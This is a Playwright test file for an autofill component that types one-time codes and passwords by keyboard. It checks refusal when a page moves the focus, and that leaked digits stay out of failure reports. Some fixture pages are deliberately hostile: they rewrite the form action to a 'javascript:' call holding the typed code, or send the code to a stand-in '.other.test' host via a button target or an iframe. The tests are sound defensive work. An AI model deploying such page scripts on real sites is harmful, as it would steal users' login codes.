import { expect, test } from "@playwright/test";
import type { Page } from "playwright";
import { Effect } from "effect";
import { fillAutofillStep } from "../../src/destinations/autofill-fill.js";
import { inspectAutofillStep, type AutofillStep } from "../../src/destinations/autofill-step.js";
import { expectNotCarried, hostKeyboard, hostPage } from "./autofill-host-page.js";

// With `typing: "keyboard"` a one-time code is typed by trusted keys. A row of one-character boxes
// that moves the focus to the next box on each character, and spreads a pasted code across itself,
// takes the first key in its first box and then holds the focus in the second. A step that names
// only the first box gets the whole code inserted at once into that box instead, as before codes
// were typed, and the page spreads it. A field of any other slot whose page moves the focus on
// mid-typing is still refused.

const site = "https://bank.example.test";
const code = "482913";
const password = "p@9x-synthetic";
// The host looks for up to 2 s for a page that sends itself before it clicks: more than the
// default 30 s allows on a busy machine once each test also types and focuses again.
test.describe.configure({ timeout: 90_000 });

/** One key down or input a field saw, reported to the test across the page's own sends. */
type Seen =
  | { readonly type: "keydown"; readonly field: string; readonly key: string; readonly trusted: boolean }
  | { readonly type: "input"; readonly field: string; readonly keyed: boolean };

/**
 * The page's script that reports each input's trusted key downs and inputs (`keyed`: whether a
 * trusted key down came first since the field's last input), and each click of Verify.
 */
const watch = `<script>
for (const field of document.querySelectorAll("input")) {
  let keyed = false;
  field.addEventListener("keydown", (event) => {
    keyed = keyed || event.isTrusted;
    window.reportSeen({ type: "keydown", field: field.name, key: event.key, trusted: event.isTrusted });
  });
  field.addEventListener("input", () => {
    window.reportSeen({ type: "input", field: field.name, keyed });
    keyed = false;
  });
}
document.getElementById("verify")?.addEventListener("click", () => window.reportClick());
</script>`;

/**
 * Six one-character boxes and a Verify button that posts the form. Each box moves the focus to
 * the next once a character goes in, and a box given more than one character, as a pasted code
 * is, spreads them across itself and the boxes after it, then focuses the last box it filled.
 * With `sendsItself`, the form submits itself once all six hold a digit, as some code screens do.
 */
const rowScreen = (sendsItself: boolean) => `<form id="form" method="post" action="/verify">
<p>Enter the code we sent you</p>
${Array.from(code, (_, at) => `<input id="box-${at + 1}" name="d${at + 1}" class="otp" inputmode="numeric" aria-label="Digit ${at + 1}"${at === 0 ? ' autocomplete="one-time-code"' : ""}>`).join("")}
<button id="verify">Verify</button>
</form>
<script>
const form = document.getElementById("form");
const boxes = [...document.querySelectorAll(".otp")];
let sent = false;
boxes.forEach((box, at) => box.addEventListener("input", () => {
  const digits = Array.from(box.value.replace(/[^0-9]/g, ""));
  if (digits.length > 1) {
    const spread = digits.slice(0, boxes.length - at);
    spread.forEach((digit, offset) => { boxes[at + offset].value = digit; });
    boxes[at + spread.length - 1].focus();
  } else if (digits.length === 1 && boxes[at + 1]) boxes[at + 1].focus();
  if (${JSON.stringify(sendsItself)} && !sent && boxes.every((each) => /^[0-9]$/.test(each.value))) {
    sent = true;
    form.requestSubmit();
  }
}));
</script>${watch}`;

/** A password field that hands the focus to another input once a character goes in. */
const passwordScreen = `<form id="form" method="post" action="/session">
<label>Password<input id="password" name="password" type="password" autocomplete="current-password"></label>
<label>Other<input id="other" name="other"></label>
<button id="verify">Sign in</button>
</form>
<script>
const field = document.getElementById("password");
field.addEventListener("input", () => {
  if (field.value !== "") document.getElementById("other").focus();
});
</script>${watch}`;

/**
 * One code box whose page, once a character goes in, moves the focus on and points the form's
 * action at a script and Verify's at an address off the site, each holding that character.
 */
const rewritingScreen = `<form id="form" method="post" action="/verify">
<label>Code<input id="code" name="code" inputmode="numeric" autocomplete="one-time-code"></label>
<label>Other<input id="other" name="other"></label>
<button id="verify">Verify</button>
</form>
<script>
const box = document.getElementById("code");
box.addEventListener("input", () => {
  if (box.value === "") return;
  document.getElementById("form").setAttribute("action", "javascript:verify('" + box.value + "')");
  document.getElementById("verify").setAttribute("formaction", "https://code-" + box.value + ".other.test/");
  document.getElementById("other").focus();
});
</script>${watch}`;

/** The step names only the row's first box. */
const firstBoxStep: AutofillStep = {
  fields: [{ selector: "#box-1", slot: "code" }],
  submit: "#verify",
};
const codeStep: AutofillStep = {
  fields: [{ selector: "#code", slot: "code" }],
  submit: "#verify",
};
const passwordStep: AutofillStep = {
  fields: [{ selector: "#password", slot: "password" }],
  submit: "#verify",
};

/** Serves `screen`, and keeps what each field saw, each Verify click and each form posted. */
const serve = async (page: Page, screen: string) => {
  const seen: Seen[] = [];
  const clicks: number[] = [];
  const received: URLSearchParams[] = [];
  await page.exposeFunction("reportSeen", (event: Seen) => void seen.push(event));
  await page.exposeFunction("reportClick", () => void clicks.push(Date.now()));
  await page.route(`${site}/**`, async (route) => {
    if (route.request().method() === "POST") {
      received.push(new URLSearchParams(route.request().postData() ?? ""));
      await route.fulfill({ contentType: "text/html", body: "<p>Signed in</p>" });
    } else await route.fulfill({ contentType: "text/html", body: screen });
  });
  await page.goto(`${site}/verify`);
  return { seen, clicks, received };
};

/**
 * Fills the step with `values` by keyboard, as the local host signs in. `beforeKeyboardCall` runs
 * before each of the keyboard's calls on the field (`hostKeyboard`).
 */
const fill = async (
  page: Page,
  step: AutofillStep,
  values: readonly string[],
  beforeKeyboardCall?: () => Promise<void>,
) => {
  const host = await hostPage(page);
  const inspection = await Effect.runPromise(
    inspectAutofillStep({ step, page: host, siteOrigin: site, authenticationOrigins: [] }),
  );
  if ("outcome" in inspection) throw new Error(`Inspection refused: ${inspection.reason}`);
  const report = await Effect.runPromise(
    fillAutofillStep({
      step,
      values,
      inspection,
      page: host,
      keyboard: (await hostKeyboard(page, beforeKeyboardCall)).keyboard,
      typing: "keyboard",
      settleMs: 2_000,
    }),
  );
  for (const value of values) expectNotCarried(host.calls, value);
  return report;
};

/** The six digits as the form posts them, one in each box. */
const postedCode = Object.fromEntries(Array.from(code, (digit, at) => [`d${at + 1}`, digit]));

test("a code typed into the first box of a row that moves the focus on each character is inserted at once there, and the host clicks Verify once", async ({
  page,
}) => {
  const { seen, clicks, received } = await serve(page, rowScreen(false));
  const report = await fill(page, firstBoxStep, [code]);
  expect(report).toMatchObject({
    outcome: "filled",
    fields: [{ slot: "code", status: "filled" }],
    submit: "clicked",
  });
  // The first digit went in by a trusted key, the focus call that bound the box again emptied it
  // with a Delete key, as a focus call empties a field that holds something, then the whole code
  // went in at once, with no key.
  expect(seen.filter((event) => event.type === "keydown")).toEqual([
    { type: "keydown", field: "d1", key: code[0], trusted: true },
    { type: "keydown", field: "d1", key: "Delete", trusted: true },
  ]);
  expect(seen.filter((event) => event.type === "input" && !event.keyed && event.field === "d1"))
    .not.toEqual([]);
  expect(clicks).toHaveLength(1);
  expect(received.map((form) => Object.fromEntries(form))).toEqual([postedCode]);
});

test("a code typed into the first box of a row that sends itself once all its boxes hold a digit is reported sent by the page, and Verify is never clicked", async ({
  page,
}) => {
  const { clicks, received } = await serve(page, rowScreen(true));
  const report = await fill(page, firstBoxStep, [code]);
  expect(report).toMatchObject({
    outcome: "filled",
    fields: [{ slot: "code", status: "filled" }],
    submit: "page",
  });
  expect(clicks).toEqual([]);
  expect(received.map((form) => Object.fromEntries(form))).toEqual([postedCode]);
});

test("a code field that loses the focus before its first key is still refused, with nothing inserted", async ({
  page,
}) => {
  const { seen, clicks, received } = await serve(page, rowScreen(false));
  let moved = false;
  // Before the keyboard's first call on the bound box, the page moves the focus to the next box.
  const report = await fill(page, firstBoxStep, [code], async () => {
    if (moved) return;
    moved = true;
    await page.evaluate(() => document.getElementById("box-2")?.focus());
  });
  expect(report).toMatchObject({
    outcome: "refused",
    reason: "credential_target_refused",
    target: 0,
    failureDetail: { context: { check: "typing_refused", insertion: "focus_moved" } },
  });
  expect(seen).toEqual([]);
  expect(await page.locator(".otp").evaluateAll((boxes) => boxes.map((box) => (box as HTMLInputElement).value))).toEqual(
    ["", "", "", "", "", ""],
  );
  expect(clicks).toEqual([]);
  expect(received).toEqual([]);
});

test("a password whose page moves the focus on after its first key is still refused, and nothing else goes in", async ({
  page,
}) => {
  const { seen, clicks, received } = await serve(page, passwordScreen);
  const report = await fill(page, passwordStep, [password]);
  expect(report).toMatchObject({
    outcome: "refused",
    reason: "credential_target_refused",
    target: 0,
    failureDetail: { context: { check: "typing_refused", insertion: "focus_moved" } },
  });
  // Only the first key went in, into the password, and nothing was inserted after it.
  expect(seen).toEqual([
    { type: "keydown", field: "password", key: password[0], trusted: true },
    { type: "input", field: "password", keyed: true },
  ]);
  expect(await page.locator("#password").inputValue()).toBe(password[0]);
  expect(await page.locator("#other").inputValue()).toBe("");
  expect(clicks).toEqual([]);
  expect(received).toEqual([]);
});

// Once a key may have gone in, page code may have put it in anything the host reads back, so a
// refusal names no origin but those judged before and keeps no script's code.
test("a code field whose page moves the focus on after its first key and points its form at that digit keeps the digit out of the refusal", async ({
  page,
}) => {
  const { received } = await serve(page, rewritingScreen);
  const report = await fill(page, codeStep, [code]);
  const context: unknown = Reflect.get({ ...Reflect.get(report, "failureDetail") }, "context");
  expect(context).toMatchObject({
    check: "destination",
    part: "form_action",
    actionOrigins: "javascript: other",
  });
  expect(context).not.toHaveProperty("actionScript");
  expect(JSON.stringify(context)).not.toContain(`code-${code[0]}`);
  expect(received).toEqual([]);
});

// A typing call whose answer is lost on a code step may still have put the code in: the screen it
// closed in place then names no origin but those judged before.
test("a code step whose typing answer is lost and whose screen closes in place into a frame named for the code keeps the code out of the refusal", async ({
  page,
}) => {
  const frameOrigin = `https://c${code}.other.test`;
  await page.route(`${frameOrigin}/**`, (route) =>
    route.fulfill({ contentType: "text/html", body: '<button id="verify" hidden>Verify</button>' }),
  );
  await serve(
    page,
    `<label>Code<input id="code" name="code" inputmode="numeric" autocomplete="one-time-code"></label>
<button id="verify" type="button">Verify</button>
<script>
const box = document.getElementById("code");
box.addEventListener("input", () => {
  if (box.value.length < 6) return;
  document.getElementById("verify").remove();
  const frame = document.createElement("iframe");
  frame.src = "https://c" + box.value + ".other.test/";
  document.body.append(frame);
});
</script>`,
  );
  const host = await hostPage(page);
  const inspection = await Effect.runPromise(
    inspectAutofillStep({ step: codeStep, page: host, siteOrigin: site, authenticationOrigins: [] }),
  );
  if ("outcome" in inspection) throw new Error(`Inspection refused: ${inspection.reason}`);
  const { keyboard } = await hostKeyboard(page);
  const report = await Effect.runPromise(
    fillAutofillStep({
      step: codeStep,
      values: [code],
      inspection,
      page: host,
      // The code goes in, then the call's answer is lost.
      keyboard: {
        insertText: (target, text, options) =>
          keyboard.insertText(target, text, options).pipe(
            Effect.zipRight(Effect.promise(() => page.frameLocator("iframe").locator("#verify").waitFor({ state: "attached" }))),
            Effect.zipRight(Effect.fail(new Error("Answer lost"))),
          ),
      },
      settleMs: 2_000,
    }),
  );
  const context: unknown = Reflect.get({ ...Reflect.get(report, "failureDetail") }, "context");
  expect(context).toMatchObject({ check: "not_found", matches: "other 0/1" });
  expect(JSON.stringify(context)).not.toContain(code);
});
